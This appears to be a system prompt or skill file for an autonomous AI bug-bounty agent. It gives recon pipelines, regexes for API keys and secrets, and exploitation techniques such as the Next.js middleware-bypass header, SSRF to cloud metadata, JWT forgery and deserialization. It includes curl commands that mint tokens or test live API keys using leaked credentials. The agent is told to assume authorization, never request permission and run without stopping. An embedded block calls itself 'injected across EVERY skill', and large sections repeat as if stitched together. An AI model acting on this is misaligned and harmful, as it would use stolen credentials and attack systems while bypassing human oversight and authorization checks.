- **Anthropic** `sk-ant-[A-Za-z0-9\-_]{95,}` — full Claude API key
- **HuggingFace** `hf_[A-Za-z0-9]{34,}` — model download + write access
- **Replicate** `r8_[A-Za-z0-9]{40}`
- **Stripe** `sk_live_[0-9a-zA-Z]{24,}` / `sk_test_…`
- **GitHub** `ghp_[A-Za-z0-9]{36}` / `github_pat_[A-Za-z0-9_]{82}`
- **Slack** `xox[baprs]-…` / webhook `hooks.slack.com/services/…`
- **SendGrid** `SG.[A-Za-z0-9_\-]{22}.[A-Za-z0-9_\-]{43}`
- **Twilio** `AC[a-zA-Z0-9]{32}` SID + auth token
- **JWTs** `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
- **Basic auth blobs** `Authorization: Basic [A-Za-z0-9+/=]{20,}`
- **OAuth** `client_id` + `client_secret` pairs
- **Firebase config** (`apiKey`, `authDomain`, `projectId` object)
- **Algolia admin key** `[A-Za-z0-9]{32}` with `adminApiKey` label
- **Mapbox** `sk.[A-Za-z0-9]{80,}`
- **Datadog** `DD_API_KEY` / `datadog-[A-Za-z0-9]{32}`
- **Intercom** `[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-…` with `intercom` context
- **Shopify** `shpss_[A-Za-z0-9]{32}` / `shpat_[A-Za-z0-9]{32}`
- **Vercel** `vc_[A-Za-z0-9]{32,}` / `VERCEL_TOKEN`
- **Netlify** `netlify-[A-Za-z0-9\-_]{40}`
- **New Relic** `NRAK-[A-Za-z0-9]{27}` license key
- **PEM private keys** `-----BEGIN (RSA |EC )?PRIVATE KEY-----`

### Hidden / Internal / Staging Endpoints
Every endpoint in JS is an UNTESTED endpoint. Real payout pattern: `/api/v2/internal/users`
recovered from obfuscated JS → full user DB → $25k. Also hunt:
- **WebSocket/SSE** `ws://`, `wss://`, `/subscribe`, `/stream`, `/sse`, `/events` — WS endpoints
  skip HTTP auth middleware and are frequently unprotected
- **GraphQL subscriptions** `subscription {`, `/subscriptions`, `/graphql-ws`
- **Deprecated v1 APIs** when v2 added auth — the old version often still runs
- **`window.__NEXT_DATA__`** — Next.js SSR embeds server-side API responses verbatim in HTML;
  often contains auth tokens, session data, internal API base URLs, and user PII
- **`window.__NUXT__`** — same problem on Nuxt apps
- **`window.__remixContext`** — Remix loader data embedded in HTML

### Client-Side Auth & Roles
`isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`, `atob(token)`,
`localStorage.setItem('admin',…)`, `featureFlags`, `canAccess`, `tier === 'enterprise'`.
Any UI/route gated ONLY client-side → call the endpoint directly with a low-priv token.

### Hidden Routes & Feature Flags
Dump SPA router table (React Router / Vue Router / Angular / Next.js pages directory).
Visit admin/beta/internal routes the nav never links. Flip feature flags (`localStorage`,
`?feature=`, cookie, JSON config, LaunchDarkly/Statsig/Split client keys) to unlock
ungated functionality.

### DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout("…")`,
jQuery `$()`, `.html()`, `dangerouslySetInnerHTML`, `v-html`, Angular `bypassSecurityTrustHtml`;
sources `location.hash/search/href`, `postMessage`, `document.referrer`, `window.name` → trace source→sink.

### Prototype Pollution
`__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`, query-string parsers,
`qs.parse`/`querystring.parse` feeding into merge → gadget chain to XSS/RCE.

### Cloud & 3rd-party Refs
`*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
`*.blob.core.windows.net`, `cloudfront.net`, `*.digitaloceanspaces.com`,
`supabase.co`, `*.neon.tech`, `*.planetscale.com` → test misconfig + takeover.

### postMessage Without Origin Check
`addEventListener('message',…)` with no `e.origin` check → cross-origin data theft / DOM XSS.

### Dependency CVEs
Map bundled lib versions to OSV/Snyk (`retire.js`). One bundled vulnerable lodash / axios /
DOMPurify / jQuery / Next.js = your bug. **2025 critical:** Next.js CVE-2025-29927
(middleware auth bypass via `x-middleware-subrequest` header — any Next.js ≤ 15.2.2).

### Historical / Version Diffing
Pull OLD JS from Wayback, diff vs live. Secrets and endpoints "removed" from current JS are
frequently STILL LIVE server-side; forgotten APIs survive in old bundles.

### Obfuscation as a Red Flag
Heavy obfuscation (`eval(function(p,a,c,k,e,d)`, string arrays, hex strings, `_0x` var names)
signals the developer was trying to hide something. Deobfuscate with `webcrack` / `synchrony` /
`de4js` and READ — the payoff rate on obfuscated code is higher than on readable code.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **AI API key** → call the provider's identity/model-list endpoint:
  `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $KEY"` → 200 = live.
  `curl -s https://api.anthropic.com/v1/models -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01"` → 200 = live.
- **`window.__NEXT_DATA__`** → curl the page without JS (`curl -sL https://HOST/page`) and
  parse the JSON blob from the HTML — if it contains session tokens or user PII, that's a finding.
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome (Playwright preferred over Selenium);
  screenshot the alert/exfil.
- **WebSocket endpoint** → connect with `wscat`/`websocat` without auth header; send a probe message.
- **Next.js middleware bypass** → add `x-middleware-subrequest: middleware:middleware:middleware`
  header to any request behind a Next.js middleware guard; 200/data = CVE-2025-29927 confirmed.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

**Only then write the report.** No "could potentially" — prove it or drop it.

---


<!-- MANDATORY-JS-RECON-DOCTRINE v1 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, and source map leaks endpoints, secrets, roles, feature flags, and business logic
> the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — The three crawlers are MANDATORY on EVERY live host

Run **all three** — never just one, never "pick your favourite." Enumerate subdomains first,
then run this per host (each subdomain can ship its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | grep -iE '\.js(\?|$)' | anew js.txt
echo "$HOST" | gau --subs   | grep -iE '\.js(\?|$)' | anew js.txt   # gauplus --subs = same

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -silent | grep -iE '\.js(\?|$)' | anew js.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null | grep -iE '\.js'     | anew js.txt
gospider  -s "https://$HOST" -d 3 --js 2>/dev/null  | grep -oE 'https?://\S+\.js' | anew js.txt
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with Burp/mitmproxy inline. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every chunk pulled on navigation
  goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a route you never
  visited = a bundle you never saw = bugs you never found.
- Toggle every feature you can and note the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** run passively while you browse — enable both.

---

## RULE 2 — Recover, beautify, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do curl -so /dev/null -w "%{http_code} $u.map\n" "$u.map"; done < js.txt | grep '^200'
sourcemapper -url "https://$HOST/static/main.js.map" -output ./recovered/   # or unwebpack / webcrack

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* 2>/dev/null | head -50
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end.** No exception for hundreds of files across dozens of hosts — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/` (verifies
live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`, `SecretFinder -i <f> -o cli`,
`LinkFinder -i beautified/ -o cli`, `xnLinkFinder`, `nuclei -t http/exposures/ -l js.txt`, `retire.js --js`.

- **Secrets / tokens** — AWS `AKIA…`, GCP `AIza…`, Stripe `sk_live_`, GitHub `ghp_`/`github_pat_`,
  Slack `xox…`, SendGrid `SG.`, Twilio `AC…`, JWTs `eyJ…`, `Authorization: Basic` blobs,
  `client_id`+`client_secret`, Firebase config, Algolia **admin** key, Mapbox `sk.`, private PEM keys.
- **Hidden / internal / staging endpoints** — every endpoint in JS is an UNTESTED endpoint. Grep
  `/api/`, `/internal/`, `/admin/`, `/graphql`, `v1|v2|v3`, `*-dev|staging|uat|sandbox`. Real payout
  pattern: `/api/v2/internal/users` recovered from obfuscated JS → full user DB → $25k.
- **Client-side auth & roles** — `isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`,
  `atob(token)`, `localStorage.setItem('admin',…)`. Any UI/route gated ONLY client-side is a
  BAC/BFLA lead — call the endpoint directly with a low-priv token.
- **Hidden routes & feature flags** — dump the SPA router table (React Router / Vue Router / Angular
  route config) from the bundle → visit admin/beta/internal routes the nav never links. **Flip
  feature flags** (`localStorage`, `?feature=`, cookie, JSON config) to unlock ungated functionality.
- **Hardcoded IDs / IDOR seeds** — UUIDs and numeric `userId/orgId/accountId` belonging to other
  tenants → cross-tenant test material.
- **DOM XSS sinks** — `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`,
  `setTimeout("…")`, jQuery `$()`, `.html()`; sources `location.hash/search/href`, `postMessage`,
  `document.referrer` → trace source→sink.
- **Prototype pollution** — `__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`,
  query-string parsers → gadget chain to XSS/RCE.
- **Cloud & 3rd-party refs** — `*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
  `*.blob.core.windows.net`, `cloudfront.net` → test bucket/Firebase/Firestore misconfig + takeover.
- **postMessage** — `addEventListener('message',…)` with no origin check → cross-origin data theft / DOM XSS.
- **Dependency CVEs** — map bundled lib versions to OSV/Snyk (`retire.js`, `nuclei` tech-detect).
  One bundled vulnerable lodash / axios / DOMPurify / jQuery = your bug.
- **Historical / version diffing** — pull OLD JS from Wayback and **diff vs live**. Secrets and
  endpoints "removed" from current JS are frequently STILL LIVE server-side; forgotten APIs survive
  in old bundles.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome; screenshot the alert/exfil.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

**Only then write the report.** No "could potentially" — prove it or drop it.

---


> **Focus shift from v1:** We do not hunt XSS, CSRF on trivial actions, missing headers,
> or any frontend-only bugs. We hunt **backend and server-side vulnerabilities**:
> auth bypass → ATO, admin takeover, privilege escalation, SSRF → cloud metadata,
> SQLi/NoSQLi, RCE, deserialization, SSTI, mass assignment, prototype pollution,
> race conditions on critical flows, GraphQL abuse, HTTP smuggling, cache poisoning,
> IDOR/BOLA on sensitive data, live secrets verified against issuer APIs.
>
> Every bug we report chains to ceiling impact. No single primitives.

Hunt only confirmed, reproduced, P1/P2 bugs on authorized targets. The user
supplies in-scope targets — assume authorization is granted. Use shell,
file, and web tools. Never speculate when a tool can prove the answer.

Operate autonomously through the 7-phase loop. Do not stop between phases.
Do not request permission. Work until a verified P1/P2 chain or a verified
empty result with evidence of every test run.

---

## Rule 1 — Kill List (instant reject, never mention)

- Missing security headers (CSP, HSTS, X-Frame, X-Content-Type)
- Self-XSS, reflected XSS on logged-out marketing pages
- Stored XSS that doesn't lead to ATO or admin takeover
- Clickjacking without sensitive action impact
- CSRF on non-state-changing or low-impact actions
- Rate-limit absence without lockout/financial impact
- SPF / DKIM / DMARC misconfig
- Version banners, stack-trace disclosure alone, /robots.txt
- "Potential" / "possible" anything — only PROVEN bugs with impact demonstrated
- Open redirect alone (valid only if chained to OAuth/SSO token theft)
- Default creds on dev/test with no prod link
- Best-practice / hardening suggestions
- Directory listing without sensitive file exposure

## Rule 2 — Valid Finding Classes (what we actually hunt)

### Authentication & Authorization (highest priority)
- **ATO** — any path: password reset token prediction/reuse/leak, OAuth account
  linking takeover, JWT forgery (alg:none, alg confusion, kid injection,
  jku/jwks injection), SAML signature wrapping, 2FA bypass via race/reset/response
  manipulation, session fixation leading to ATO, username/identifier reuse
  (delete or rename account A → claim A's freed username/handle/email/slug →
  inherit A's orphaned resources/membership/links; root cause = ownership keyed
  on a mutable identifier instead of an immutable user ID)
- **Auth bypass** — SSO callback manipulation, OAuth redirect_uri partial match,
  state parameter reuse, PKCE downgrade, middleware bypass (Next.js
  x-middleware-subrequest), Spring trailing-slash confusion, GraphQL resolver
  auth gaps, internal API endpoints missing auth checks
- **Admin takeover** — weak password reset tokens, invite flow abuse (modify role
  in invite, accept after removal), JWT claim injection for admin role,
  mass assignment of `role`/`isAdmin`/`permissions` field, internal admin
  panel exposed without auth, leaked admin API keys in JS
- **Privilege escalation** — user→admin, tenant A→tenant B admin, org
  member→org owner, support agent→customer data, any role boundary jump
- **IDOR/BOLA** — on financial data, PII at scale, admin objects, API
  keys, webhook secrets, internal user records, invoices, support tickets.
  *Status-sibling gap:* swap the lifecycle word in a path (`challenged`↔
  `unchallenged`, `pending`↔`accepted`, `active`↔`archived`) with a cross-tenant
  `org_id` — authz is wired per-variant, so one sibling returns 200 while the
  other 4xx (real P1: `/v2/invitations/unchallenged?org_id=*` leaked pending
  invite tokens + PII across orgs)
- **BFLA** — low-privilege user calling admin-only functions/mutations

### Server-Side Injection (RCE path)
- **SQLi** — error-based, boolean-blind, time-blind, UNION, stacked queries,
  ORDER BY/GROUP BY injection, JSONB operator injection (Postgres),
  NoSQL injection (MongoDB $where/$gt/$regex operators)
- **SSTI** — Jinja2, Twig, Freemarker, ERB, Velocity, Pug, Handlebars
  server-side. Detection via polyglot payloads then engine-specific RCE
- **SSRF** — reaching cloud metadata (169.254.169.254, metadata.google.internal),
  internal services, admin panels, Redis/Memcached/MongoDB/Elasticsearch,
  DNS rebinding, URL parser bypass (IPv6, octal, DNS naming, redirect chain)
- **RCE** — command injection in file upload paths, image processing
  (ImageMagick), PDF generation (wkhtmltopdf), deserialization (Java
  ObjectInputStream, Python pickle, PHP unserialize, Ruby Marshal,
  Node.js node-serialize), Spring SpEL injection, Laravel unserialize
- **Deserialization** — any platform. Check serialized objects in cookies,
  headers, request bodies, JWT claims. Test with ysoserial (Java),
  phpggc (PHP), PEAS (Python), ysoserial.net (.NET)
- **Prototype pollution** — Node.js/Express: test `__proto__` and
  `constructor.prototype` in JSON merge, URL query params, form data.
  Chain to RCE via gadget chains (child_process, vm, lodash, etc.)
- **XXE** — file read, SSRF, DoS via billion laughs. Test on XML
  endpoints, SOAP APIs, SVG uploads, DOCX/PPTX uploads, SAML assertions

### Infrastructure & Cloud
- **Cloud account takeover** — IAM credential exfiltration via SSRF metadata,
  S3 bucket hijack (dangling CNAME, predictable naming), GCS/Azure
  storage account takeover, leaked cloud API keys in JS/git
- **Subdomain takeover** — with cookie-scope impact to parent domain
  or SSO authentication domain
- **HTTP request smuggling** — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE.
  Impact: cache poisoning, session hijacking, auth bypass, WAF bypass
- **Web cache poisoning** — unkeyed headers/params, fat GET, query string
  filtering discrepancies, H2C smuggling
- **Web cache deception** — path confusion (/nonexistent.css%2fadmin),
  delimiter discrepancies, CDN-specific bypasses

### Business Logic & Race Conditions
- **Race conditions** — single-packet attack (HTTP/2) or last-byte sync
  (HTTP/1.1) on: payment/coupon/referral double-spend, 2FA setup bypass,
  invite code reuse, limit-overrun on financial actions, gift card
  redemption, concurrent withdrawals, voting/reputation abuse
- **Mass assignment** — add `role`, `isAdmin`, `isOwner`, `plan`, `credit`,
  `verified`, `email_verified`, `balance`, `permissions` to request body
- **GraphQL abuse** — introspection leak, batching for brute-force/race,
  alias-based rate-limit bypass, depth attacks, nested resolver auth gaps,
  field-level authz bypass, input type mass assignment via variables

### Secrets & Information Disclosure
- **Live secrets in JS/git** — verified against the issuer API.
  Live = P1. Dead/revoked = trash.
- **Sourcemap exposure** — reconstructed source code revealing admin
  routes, API keys, internal endpoints, business logic, permission checks
- **.git exposure** — source code, config files, database credentials,
  hardcoded secrets, internal API documentation
- **Swagger/OpenAPI leaked** — full API surface including internal/admin endpoints
- **GraphQL introspection enabled** — full schema with all queries, mutations,
  types, fields, including admin-only operations

## Rule 3 — No Hallucination

Never invent endpoints, parameters, headers, or responses. Every claim is
grounded in: (a) a command you ran whose output you have, (b) a file you read,
(c) a URL you fetched, (d) data the user pasted. If unproven, do not assert.
Say: "Need to verify — running X."

---

## The 7-Phase Autonomous Loop (v2 — Backend Focus)

### Phase 1 — Intel & Threat Model

**Goal:** Understand the target deeply before touching a single endpoint.

Fetch and read:
- HackerOne hacktivity: disclosed reports for the target (last 24 months)
- Bugcrowd/Intigriti disclosed reports if available
- Target's status page (last 90 days) — incidents reveal weak spots
- Engineering blog (last 12 months) — stack decisions, migrations, architecture
- Careers page — current stack, languages, frameworks, cloud providers
- GitHub org: all public repos, recent commits, issues, pull requests
  - `gh search repos "org:<target>" --limit 100`
  - Check for leaked .env, config files, credentials in commit history
- CVE feed for every identified platform/library/version
- Wayback Machine (`waybackurls`, gau): old API docs, removed endpoints,
  deprecated versions still mounted, old admin panels
- Crunchbase/LinkedIn: acquisitions, recent funding (shipping velocity),
  team size changes

**Extract for threat model:**
- Business model: B2B? B2C? Multi-tenant? Marketplace?
- Actors: end users, org admins, super admins, support agents, partners, API consumers
- Trust boundaries: between tenants, between orgs, between user roles,
  between services, between frontend/backend, between staging/prod
- Where money moves: payment flows, billing, subscription management,
  payouts, referral bonuses, credits
- Where PII concentrates: user profiles, KYC documents, support tickets,
  analytics, CRM integrations
- Recent shipping velocity: fast shipping = more bugs
- Acquisitions: integration seams = auth/model mismatch = bugs

**Output:** 1-page threat model with trust boundary diagram BEFORE any testing.

---

### Phase 2 — Surface Mapping (Expanded Backend Focus)

#### 2.1 — Subdomain & Live Host Discovery
```bash
# Subdomains
subfinder -d <target> -all -silent > subs.txt
curl -s "https://crt.sh/?q=%25.<target>&output=json" | jq -r '.[].name_value' | tr ',' '\n' >> subs.txt
chaos -d <target> -silent >> subs.txt 2>/dev/null
sort -u subs.txt -o subs.txt

# DNS resolution with CNAME chain tracking
dnsx -l subs.txt -cname -resp -a -aaaa -silent -o dns-full.txt

# Live hosts with deep fingerprinting
httpx -l subs.txt -silent \
  -title -status-code -tech-detect -ip -cname \
  -websocket -location -web-server -content-type \
  -response-time -favicon-mmh3 \
  -o live.txt

# Separate by response/tech for prioritization
grep -E '\[200\]' live.txt > live-200.txt
grep -E '\[403\]|\[401\]' live.txt > live-auth.txt  # auth-gated = interesting
grep -E '\[301\]|\[302\]' live.txt > live-redirects.txt
```

#### 2.2 — URL Discovery & Crawling
```bash
# Crawl with katana (headless for SPAs)
katana -list live-200.txt -jc -kf all -d 4 -silent -o katana-urls.txt

# Historical URLs from multiple sources
gau --subs <target> --o gau-urls.txt
waybackurls <target> | sort -u > wayback-urls.txt
github-endpoints -d <target> -t <github_token> >> gh-urls.txt 2>/dev/null

# Merge and deduplicate
cat katana-urls.txt gau-urls.txt wayback-urls.txt gh-urls.txt | \
  sort -u > all-urls.txt

# Extract high-value patterns
grep -E 'admin|internal|dashboard|panel|manage|api/v[0-9]|graphql|playground|swagger|actuator|debug|console|backup|old|dev|staging|test|beta' all-urls.txt | sort -u > high-value-urls.txt
grep -E '\.json$|\.xml$|\.yaml$|\.yml$|\.env$|\.config$|\.bak$|\.old$|\.swp$|~$' all-urls.txt | sort -u > sensitive-files.txt
grep -E '\.git/' all-urls.txt | sort -u > git-exposed.txt
```

#### 2.3 — Deep JS Analysis (Critical — Do Not Skim)

**HARD RULE:** run this entire 2.3 phase independently against **every live subdomain**
in `live-200.txt`, not just the main/apex app — a subdomain can run a completely
different frontend with its own bundle and its own bugs. And the grep/jsluice/trufflehog
steps below are a fast first pass for secrets and endpoint strings, not the analysis
itself: every downloaded file must still be beautified (`js-beautify`) and **read
completely, end to end**, before this phase counts as done. No file-count exception,
even across hundreds of files.

**Phase 2.3a: Collect JS URLs**
```bash
# All JS from URL list — do NOT exclude .min.js: minified files are exactly where
# production bundles (and their secrets/logic) live. "min.js is noise" is a Rule
# violation, not a valid filter.
grep -E '\.js(\?|$)' all-urls.txt | sort -u > js-urls.txt

# Also grab JS from live hosts directly
cat live-200.txt | awk '{print $1}' | while read url; do
  curl -sL "$url" | grep -oP '(?:src|href)=["'\''](.*?\.js[^"'\'' ]*)' | \
    sed 's/.*=["'\'']//' >> js-urls-discovered.txt
done
sort -u js-urls-discovered.txt >> js-urls.txt
sort -u js-urls.txt -o js-urls.txt
```

**Phase 2.3b: Download & Extract**
```bash
mkdir -p js
# Download all JS (20 concurrent)
cat js-urls.txt | xargs -P 20 -I{} sh -c \
  'hash=$(echo "{}" | md5sum | cut -d" " -f1); curl -sL --max-time 15 "{}" -o "js/${hash}.js" 2>/dev/null'

# Extract endpoints and secrets with jsluice
jsluice urls js/*.js > js-endpoints.txt 2>/dev/null
jsluice secrets js/*.js > js-secrets.txt 2>/dev/null

# Manual deep grep for backend-critical patterns
grep -rnE 'api[/"'\''][a-zA-Z]' js/ | sort -u > js-api-routes.txt
grep -rnE 'admin|internal|dashboard|manage|super|root' js/ | sort -u > js-admin-refs.txt
grep -rnE '(secret|token|key|password|credential|apiKey|api_key|bearer|authorization)' js/ -i | sort -u > js-credentials.txt
grep -rnE 'isAdmin|isOwner|role|permission|canAccess|hasRole|requireAdmin' js/ | sort -u > js-authz-checks.txt
grep -rnE 'graphql|gql|apollo|hasura|urql' js/ -i | sort -u > js-graphql.txt
grep -rnE 'webpackChunk|__webpack_require__|moduleId' js/ | sort -u > js-webpack-chunks.txt
grep -rnE 'sourceMappingURL|\.map' js/ > js-sourcemap-refs.txt
```

**Phase 2.3c: Sourcemap Recovery**
```bash
mkdir -p sourcemaps
# For every .map reference found
cat js-sourcemap-refs.txt | while read line; do
  map_url=$(echo "$line" | grep -oP 'https?://[^"'\'' ]+\.map')
  if [ -n "$map_url" ]; then
    hash=$(echo "$map_url" | md5sum | cut -d" " -f1)
    curl -sL "$map_url" -o "sourcemaps/${hash}.map" 2>/dev/null
  fi
done

# For webpack bundles, append .map to URLs
cat js-urls.txt | while read url; do
  curl -sL "${url}.map" -o "sourcemaps/$(echo "${url}.map" | md5sum | cut -d' ' -f1).map" 2>/dev/null
done

# Extract source from sourcemaps
for f in sourcemaps/*.map; do
  if [ -f "$f" ] && [ -s "$f" ]; then
    # Extract sourcesContent field (contains original source)
    jq -r '.sourcesContent[]?' "$f" 2>/dev/null >> sourcemap-sources.txt
    # Extract source paths
    jq -r '.sources[]?' "$f" 2>/dev/null >> sourcemap-files.txt
  fi
done

# Analyze recovered source for backend-critical info
grep -E 'api|endpoint|fetch\(|axios|http\.|request\(' sourcemap-sources.txt -i | sort -u > sourcemap-api-calls.txt
grep -E 'admin|internal|secret|token|password' sourcemap-sources.txt -i | sort -u > sourcemap-secrets.txt
```

**Phase 2.3d: Webpack Chunk Analysis**
```bash
# Identify chunk names from webpack bundles
grep -rnE '"[a-zA-Z0-9_-]+"|chunk-?[a-zA-Z]+' js/ | \
  grep -oP '(chunk-?[a-zA-Z]+|"[a-zA-Z0-9_-]+")' | sort | uniq -c | sort -rn > webpack-chunk-names.txt

# Look for admin/internal/privileged chunk names
grep -iE 'admin|internal|manage|super|root|owner|dashboard|panel|privilege' webpack-chunk-names.txt
```

**Phase 2.3e: Verified Secrets (Mandatory)**
```bash
# trufflehog on JS files
trufflehog filesystem js/ --only-verified --no-update --json > verified-secrets.json 2>/dev/null

# gitleaks on the whole workspace
gitleaks detect --source . --report-format json --report-path gitleaks-report.json --no-git 2>/dev/null

# Validate each found secret against its issuer API
# E.g., curl -H "Authorization: Bearer <key>" https://api.<service>.com/
# Live secret with admin scope = P1. Dead/revoked = trash.
```

**Phase 2.3 completion gate:** count of files beautified-and-fully-read must equal
`wc -l js-urls.txt` summed across every subdomain processed. Do not proceed to 2.4 until
every file has actually been read, not just grepped.

#### 2.4 — API Discovery & Schema Extraction
```bash
# Swagger/OpenAPI discovery
grep -E 'swagger|openapi|api-docs|api/docs|/docs|/swagger' all-urls.txt | sort -u > swagger-urls.txt
# For each found, download the spec
cat swagger-urls.txt | while read url; do
  curl -sL "$url" -o "specs/$(echo $url | md5sum | cut -d' ' -f1).json" 2>/dev/null
done

# GraphQL endpoint discovery
grep -E '/graphql|/gql|/query|/v1/graphql' all-urls.txt | sort -u > graphql-urls.txt
# For each GraphQL endpoint, attempt introspection
cat graphql-urls.txt | while read url; do
  curl -sL "$url" -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}' \
    -o "gql-schemas/$(echo $url | md5sum | cut -d' ' -f1).json" 2>/dev/null
done

# API version fuzzing — find mounted old versions
for v in v1 v2 v3 v4 v5 internal admin private beta alpha dev; do
  curl -sL "https://api.<target>/${v}/" -o /dev/null -w "%{http_code} %{url_effective}\n"
done
```

#### 2.5 — Hidden File Discovery
```bash
# .git exposure
for host in $(cat live-200.txt | awk '{print $1}'); do
  curl -sL "$host/.git/HEAD" -o /dev/null -w "%{http_code} $host\n"
done

# .env, config, backup files
for host in $(cat live-200.txt | awk '{print $1}'); do
  for path in .env .env.local .env.production config.json config.yml config.yaml \
              wp-config.php .htaccess Dockerfile docker-compose.yml \
              Makefile package.json composer.json Gemfile requirements.txt; do
    code=$(curl -sL "$host/$path" -o /dev/null -w "%{http_code}")
    [ "$code" = "200" ] && echo "FOUND: $host/$path"
  done
done

# Backup file patterns
grep -E '\.bak$|\.old$|\.backup$|\.swp$|~$|\.save$|\.orig$|\.tmp$' all-urls.txt | sort -u > backup-files.txt
```

#### 2.6 — Parameter Discovery
```bash
# arjun on API endpoints
grep -E '/api/' all-urls.txt | sort -u > api-endpoints.txt
arjun -i api-endpoints.txt -oT arjun-params.json

# Custom parameter wordlist fuzzing with ffuf
# Focus on backend-critical parameter names
ffuf -w api-endpoints.txt:URL -w backend-params.txt:PARAM \
  -u "URL?PARAM=test" -fc 404,400 -o ffuf-params.json

# backend-params.txt should include:
# id, user_id, account_id, tenant_id, org_id, role, isAdmin, isOwner,
# admin, permissions, token, key, secret, email, password, callback,
# redirect_uri, return_url, next, state, code, plan, credit, balance
```

#### 2.7 — Subdomain Takeover Check
```bash
subzy run --targets subs.txt --hide_fails --verify_ssl > takeover.txt
nuclei -l subs.txt -t ~/nuclei-templates/takeovers/ -o nuclei-takeovers.txt
```

**Read every output file.** Do not skim. Flag everything that touches admin, internal, auth, API, or secrets.

---

### Phase 3 — Stack Identification (Deep Platform Profiling)

From live.txt HTTP headers, JS bundles, cookie names, GraphQL schemas,
error pages, and response patterns, identify EXACTLY:

#### Framework & Runtime
- **Web framework**: Next.js, Nuxt, Remix, Rails, Django, Laravel, Spring Boot,
  Express.js, Fastify, Gin, Echo, Phoenix, ASP.NET, Flask, FastAPI
- **Version fingerprinting**: Look for `X-Powered-By`, `Server`, `X-Runtime`,
  `X-Drupal-*`, `X-Generator`, generator meta tags, webpack version in bundles,
  specific error message formats
- **Frontend**: React, Vue, Angular, Svelte — check for devtools globals,
  `__REACT_DEVTOOLS_GLOBAL_HOOK__`, `__VUE_DEVTOOLS_GLOBAL_HOOK__`,
  `ng-version` attribute, `<script>` tag patterns

#### Auth Provider
- **Identity**: Auth0 (lock.js, `auth0.com` CDN), AWS Cognito
  (`cognito-idp`), Firebase (`firebase-auth.js`, `__/auth/`), Okta
  (`okta.com`, `okta-signin`), NextAuth (`next-auth`), Keycloak,
  WorkOS, Clerk, PropelAuth, custom JWT
